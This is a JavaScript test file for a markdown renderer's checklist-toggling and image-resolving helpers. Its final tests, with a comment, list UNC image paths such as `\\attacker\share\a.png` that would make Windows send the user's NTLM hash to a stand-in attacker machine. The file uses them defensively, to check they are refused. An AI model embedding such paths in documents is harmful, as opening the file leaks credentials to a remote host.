// Ticking a box in a checklist, as arithmetic on a string.
//
// The renderer draws the box; this is the half that writes the tick back, and
// the cases worth pinning are the ones where a naive patch corrupts a file:
// a line that is no longer the task it was when the page was drawn, a CRLF
// file that must not come back as LF, and a number pointing past the end.
import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { build } from 'esbuild'

const out = path.join(os.tmpdir(), 'iaw-markdown-test')
fs.rmSync(out, { recursive: true, force: true })
fs.mkdirSync(out, { recursive: true })

await build({
  entryPoints: { markdown: 'src/renderer/markdown.ts' },
  bundle: true,
  platform: 'node',
  format: 'esm',
  outdir: out,
})

const { toggleTaskLine, resolveImage } = await import(`file://${out}/markdown.js`)

let passed = 0
const check = (name, fn) => {
  fn()
  passed++
  console.log('  ok', name)
}

const LIST = ['# Today', '', '- [ ] buy milk', '- [x] call back', '* [ ] third'].join('\n')

check('ticks the box on the line it was told about', () => {
  assert.equal(
    toggleTaskLine(LIST, 2, true),
    ['# Today', '', '- [x] buy milk', '- [x] call back', '* [ ] third'].join('\n')
  )
})

check('clears one that was already ticked', () => {
  assert.match(toggleTaskLine(LIST, 3, false).split('\n')[3], /^- \[ \] call back$/)
})

check('leaves every other line exactly as it was', () => {
  const after = toggleTaskLine(LIST, 4, true).split('\n')
  assert.deepEqual(after.slice(0, 4), LIST.split('\n').slice(0, 4))
})

check('an ordered item is a task too', () => {
  assert.equal(toggleTaskLine('1. [ ] one\n2) [ ] two', 1, true), '1. [ ] one\n2) [x] two')
})

check('indentation and the text after the box survive', () => {
  const nested = '- [ ] top\n    - [ ] under it, with `code` and [a link](x)'
  assert.equal(
    toggleTaskLine(nested, 1, true),
    '- [ ] top\n    - [x] under it, with `code` and [a link](x)'
  )
})

check('a line that is no longer a task is refused rather than mangled', () => {
  assert.equal(toggleTaskLine(LIST, 0, true), null)
  assert.equal(toggleTaskLine(LIST, 1, true), null)
  assert.equal(toggleTaskLine('- just a bullet', 0, true), null)
})

check('a line number past the end is refused', () => {
  assert.equal(toggleTaskLine(LIST, 99, true), null)
  assert.equal(toggleTaskLine('', 0, true), null)
})

check('a CRLF file comes back as CRLF, and only the one line differs', () => {
  const crlf = '- [ ] a\r\n- [ ] b\r\n'
  const after = toggleTaskLine(crlf, 1, true)
  assert.equal(after, '- [ ] a\r\n- [x] b\r\n')
  assert.equal(after.split('\r\n').length, crlf.split('\r\n').length)
})

check('an already-ticked box asked to tick again is a no-op in content', () => {
  assert.equal(toggleTaskLine(LIST, 3, true), LIST)
})

// A document's images, and the one kind it may not ask for. Loading an image
// from another machine is a network connection, and on Windows an
// authenticated one: `![](\\attacker\share\a.png)` in a README made the app
// offer that machine the user's NTLM hash just by opening the file.
check('an image on another machine is not loaded, however it is spelled', () => {
  for (const src of [
    '\\\\attacker\\share\\a.png',
    '//attacker/share/a.png',
    '\\\\?\\UNC\\attacker\\share\\a.png',
    '\\\\.\\pipe\\a.png',
  ]) {
    assert.equal(resolveImage(src, 'C:\\docs'), null, src)
  }
})

check('local images still resolve, absolute and relative', () => {
  assert.equal(resolveImage('../shots/a.png', 'C:\\docs\\guide'), 'C:\\docs\\shots\\a.png')
  assert.equal(resolveImage('C:\\pics\\a.png', 'C:\\docs'), 'C:\\pics\\a.png')
  assert.equal(resolveImage('\\\\?\\C:\\pics\\a.png', 'C:\\docs'), '\\\\?\\C:\\pics\\a.png')
  assert.equal(resolveImage('img/a.png', '/Users/me/docs'), '/Users/me/docs/img/a.png')
})

// The README the user opened from a share is theirs to open; its own images
// sit beside it on the same machine, which is not another machine.
check('a document opened from a share still shows the images beside it', () => {
  assert.equal(resolveImage('a.png', '\\\\server\\share\\docs'), '\\\\server\\share\\docs\\a.png')
})

console.log(`\n${passed} checks passed`)
